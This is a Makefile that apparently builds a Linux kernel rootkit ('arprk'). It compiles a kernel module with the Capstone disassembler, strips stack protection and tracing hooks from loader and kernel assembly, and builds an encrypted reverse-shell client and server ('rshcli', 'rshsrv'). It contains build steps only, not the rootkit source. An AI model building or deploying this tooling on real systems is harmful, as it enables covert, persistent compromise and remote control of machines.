obj-m += arprk.o
arprk-objs := main.o mod.o loader-asm.o kernel-asm.o capstone/cs.o capstone/utils.o capstone/SStream.o capstone/MCInstrDesc.o capstone/MCRegisterInfo.o capstone/arch/X86/X86DisassemblerDecoder.o capstone/arch/X86/X86Disassembler.o capstone/arch/X86/X86IntelInstPrinter.o capstone/arch/X86/X86ATTInstPrinter.o capstone/arch/X86/X86Mapping.o capstone/arch/X86/X86Module.o capstone/MCInst.o

EXTRA_CFLAGS := -O0 -I$(PWD)/capstone/include -DCAPSTONE_USE_SYS_DYN_MEM -DCAPSTONE_HAS_X86

KERNEL_HEADERS = /lib/modules/$(shell uname -r)/build

CFLAGS_loader.o := -fno-stack-protector -mno-fentry -fno-profile -Wno-error=incompatible-pointer-types
CFLAGS_kernel.o := -mcmodel=small -mno-fentry -fpic -fpie -fPIE -pie -fno-stack-protector -fno-profile -mindirect-branch=keep -mno-indirect-branch-register

RSHELL_CFLAGS = -Wall -Os

all: arprk

reloctest:
	echo "\t.text" > reloc_test-asm.s
	gcc -mcmodel=small -fno-pie -no-pie -fno-PIE -fpic -fpie -pie -fPIE -S reloc_test.c
	grep -vE "\.cfi|\.file|\.text|\.rodata|\.bss|\.data|\.version|\.section|\.align|\.p2align|\.balign|\.ident|__fentry__|__stack_chk_fail" reloc_test.s >> reloc_test-asm.s 
	gcc -o reloc_test reloc_test-asm.s

conf:
	python3 arprk-conf.py

rshell:
	gcc $(RSHELL_CFLAGS) pel.c aes.c sha1.c rshcli.c -o rshcli
	gcc $(RSHELL_CFLAGS) pel.c aes.c sha1.c rshsrv.c -o rshsrv -lutil

arprk: conf rshell
	make V=1 -C $(KERNEL_HEADERS) M=$(PWD) loader.s
	python remove-unused.py loader.s > loader-asm.s
	gcc -o loader-asm.o -c loader-asm.s
	make V=1 -C $(KERNEL_HEADERS) M=$(PWD) kernel.s
	echo "\t.data" > kernel-asm.s
	grep -vE "\.file|\.text|\.rodata|\.bss|\.data|\.version|\.section|\.align|\.p2align|\.balign|\.ident" kernel.s | sed -e 's/current_task@PLT/current_task/g' -e 's/cpu_tss@PLT/cpu_tss/g' >> kernel-asm.s
	python remove-unused.py kernel-asm.s > kernel-asm2.s
	mv kernel-asm2.s kernel-asm.s
	gcc -o kernel-asm.o -c kernel-asm.s
	make V=1 -C $(KERNEL_HEADERS) M=$(PWD) modules
	gcc rela-patch.c -o rela-patch
	make CAPSTONE_ARCHS="x86_64" -C python3
	mkdir -p python3/bindings/python/capstone/lib
	cp python3/libcapstone.so python3/bindings/python/capstone/lib/

clean:
	make V=1 -C $(KERNEL_HEADERS) M=$(PWD) clean
	make -C python3 clean
	rm rshcli rshsrv
	rm arprk-conf.h
